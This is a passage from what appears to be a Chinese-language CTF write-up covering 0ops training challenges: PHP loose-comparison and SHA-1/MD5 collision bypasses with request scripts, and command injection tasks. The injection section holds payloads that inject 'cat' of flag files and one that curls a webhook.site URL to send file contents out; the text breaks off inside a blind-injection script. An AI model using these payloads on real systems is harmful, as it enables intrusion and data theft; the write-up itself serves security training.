class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$user</span> &amp;&amp; <span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = (<span class="keyword">string</span>) <span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$pass</span> = (<span class="keyword">string</span>) <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="variable">$pass</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$user</span>) != <span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>在这样的弱比较里，0e开头的会被识别成科学计数法，为0×10^x，结果均为0，比较时0&#x3D;0为true绕过。<br>常用的弱比较绕过：<a target="_blank" rel="noopener" href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a><br>譬如可构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=aaroZmOk&amp;pass=aaK1STfY</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{621cd991cff016fdaa5947c83bc6cecb}</p>
</blockquote>
<h2 id="php-tricks-shatter-sha1"><a href="#php-tricks-shatter-sha1" class="headerlink" title="php tricks - shatter sha1"></a>php tricks - shatter sha1</h2><p>sha1强碰撞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$user</span> &amp;&amp; <span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = (<span class="keyword">string</span>) <span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$pass</span> = (<span class="keyword">string</span>) <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="variable">$pass</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$user</span>) !== <span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>网上找到一些资料</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line"></span><br><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>

<p>或者</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&quot;</span></span><br><span class="line">b = <span class="string">&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&quot;</span></span><br><span class="line"><span class="comment"># url = &#x27;http://web1.0ops.sjtu.cn:40004/hash3/index.php?user=&#x27; + a + &#x27;&amp;pass=&#x27; + b</span></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/test3.php?user=&#x27;</span> + a + <span class="string">&#x27;&amp;pass=&#x27;</span> + b</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>本地秒通，远程不知道咋回事</p>
<p>果然是网的问题，连校园网之后秒出</p>
<blockquote>
<p>0ops{1c32d762d2ff69f0dbd47d7c0866b5ec}</p>
</blockquote>
<h2 id="php-tricks-ancient"><a href="#php-tricks-ancient" class="headerlink" title="php tricks - ancient"></a>php tricks - ancient</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$str</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;O_O&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$str</span> &lt; <span class="number">0xffffffff</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$str</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>首先需要传参O_O，但是参数中又不能有O_O，可以用O.O绕过<br>其次数组在与0xffffffff比较时，会直接返回false，因此能通过<br>最后O.O[]&#x3D;1经过string转换后为Array，跟数字比较时会转换为0，因此能通过</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?O.O[]=1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{40e60b926bedbdaceedf950072c74407}</p>
</blockquote>
<h2 id="md5-collision-1"><a href="#md5-collision-1" class="headerlink" title="md5 collision 1"></a>md5 collision 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$user</span> &amp;&amp; <span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = (<span class="keyword">string</span>) <span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$pass</span> = (<span class="keyword">string</span>) <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="variable">$pass</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;user != pass&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$user</span>, <span class="string">&quot;0opsoj&quot;</span>) === False)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;don&#x27;t contain 0opsoj&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;md5(user) !== md5(pass)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>利用MD5碰撞特性，构造两个不同的字符串但具有相同的MD5值：<br>选择已知的MD5碰撞对：<br>字符串A：d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70<br>字符串B：d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70<br>这两个字符串的MD5值相同：79054025255fb1a26e4bc422aef54eb4<br>在碰撞对后添加”0opsoj”：<br>最终user：碰撞字符串A + “0opsoj”<br>最终pass：碰撞字符串B + “0opsoj”<br>添加相同后缀后，MD5值仍然相同</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知MD5碰撞对</span></span><br><span class="line">collision1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&quot;</span>)</span><br><span class="line">collision2 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加后缀&quot;0opsoj&quot;</span></span><br><span class="line">suffix = <span class="string">b&quot;0opsoj&quot;</span></span><br><span class="line">user = collision1 + suffix</span><br><span class="line">passwd = collision2 + suffix</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证MD5相同</span></span><br><span class="line"><span class="keyword">assert</span> hashlib.md5(user).hexdigest() == hashlib.md5(passwd).hexdigest()</span><br><span class="line"><span class="keyword">assert</span> user != passwd</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&quot;0opsoj&quot;</span> <span class="keyword">in</span> user</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL编码</span></span><br><span class="line">user_enc = urllib.parse.quote(user)</span><br><span class="line">pass_enc = urllib.parse.quote(passwd)</span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;http://web1.0ops.sjtu.cn:40004/hash4/index.php?user=<span class="subst">&#123;user_enc&#125;</span>&amp;pass=<span class="subst">&#123;pass_enc&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{73c7876167a5fed26a2815c24a11f81f}</p>
</blockquote>
<h2 id="Basic-web"><a href="#Basic-web" class="headerlink" title="Basic web"></a>Basic web</h2><p>页面元素里提示去w3lc0me_t0_CTF.php</p>
<p>提示You are not admin，显然要修改cookie，把admin值改为1，刷新得到Can you POST flag&#x3D;0ops to me?</p>
<p>按要求提交请求后发现页面似乎经过了一个重定向，用burp抓个包，在响应中看到flag</p>
<blockquote>
<p>0ops{I_like_flag_WoW_Do_you}</p>
</blockquote>
<h2 id="cmdi-warmup"><a href="#cmdi-warmup" class="headerlink" title="cmdi - warmup"></a>cmdi - warmup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$target</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ping -c 1 &#x27;</span> . <span class="variable">$target</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;cat%20/flag/80e20712e0fccd9dc5d6c1f7932efc57</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{6079b25885347bdcac53d00775275501}</p>
</blockquote>
<h2 id="cmdi-space"><a href="#cmdi-space" class="headerlink" title="cmdi -space"></a>cmdi -space</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$target</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$search</span> = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;　&quot;</span>, <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\t&quot;</span>);</span><br><span class="line"><span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$search</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$target</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ping -c 1 &#x27;</span> . <span class="variable">$target</span>);</span><br></pre></td></tr></table></figure>

<p>空格用$IFS$1或${IFS}绕</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;cat$&#123;IFS&#125;/flag/e901a1c04ef6a6179219bd06ff8a944c</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{64b91063012f60c92feec67702be6a3e}</p>
</blockquote>
<h2 id="cmdi-outbound"><a href="#cmdi-outbound" class="headerlink" title="cmdi - outbound"></a>cmdi - outbound</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$target</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 1 &#x27;</span> . <span class="variable">$target</span>);</span><br></pre></td></tr></table></figure>

<p>无回显，考虑curl外带</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;curl%20https://webhook.site/37026723-0fcd-499b-9232-a6969857a8ec/?flag=`cat%20/flag/5f50b451545e300d1f015f262d25559c|base64`</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{aa8198ce0a9bd702f72148cde0316f55}</p>
</blockquote>
<h2 id="cmdi-blind"><a href="#cmdi-blind" class="headerlink" title="cmdi - blind"></a>cmdi - blind</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$dir</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls &#x27;</span> . <span class="variable">$dir</span>);</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 配置 ====================</span></span><br><span class="line">TARGET = <span class="string">&quot;http://web1.0ops.sjtu.cn:40018/index.php&quot;</span>   <span class="comment"># ← 